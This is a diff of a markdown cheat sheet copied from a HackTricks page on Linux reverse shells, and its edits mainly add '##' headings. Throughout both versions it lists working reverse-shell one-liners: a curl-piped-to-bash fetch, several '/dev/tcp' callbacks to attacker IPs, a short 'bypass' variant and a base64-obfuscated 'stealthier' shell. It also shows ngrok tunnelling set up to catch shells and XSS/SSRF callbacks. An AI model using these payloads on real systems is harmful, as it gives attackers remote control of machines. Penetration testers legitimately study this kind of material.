@@ -1,6 +1,6 @@
 From https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux 
 
-Bash | sh
+## Bash | sh
 
 curl https://reverse-shell.sh/1.1.1.1:3000 | bash
 bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
@@ -8,24 +8,24 @@ bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
 exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
 
-#Short and bypass (credits to Dikline)
+## Short and bypass (credits to Dikline)
 (sh)0>/dev/tcp/10.10.10.10/9091
 #after getting the previous shell to get the output to execute
 exec >&0
 
-Symbol safe shell
+## Symbol safe shell
 
-#If you need a more stable connection do:
+## If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 
-#Stealthier method
+## Stealthier method
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | b
 
 
 
 
-ngrok
+## ngrok
 
 ngrok is a tool to expose solutions to Internet in one command line.
 Exposition URI are like: UID.ngrok.io
@@ -37,7 +37,7 @@ Installation
 
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
-# Init configuration, with your token
+ Init configuration, with your token
 ./ngrok config edit
 
 Basic usages
@@ -53,12 +53,12 @@ Tunneling TCP
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 
-Exposing files with HTTP
+## Exposing files with HTTP
 
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 
-Sniffing HTTP calls
+## Sniffing HTTP calls
 
 Useful for XSS,SSRF,SSTI ...
 Directly from stdout or in the HTTP interface http://127.0.0.1:4040.
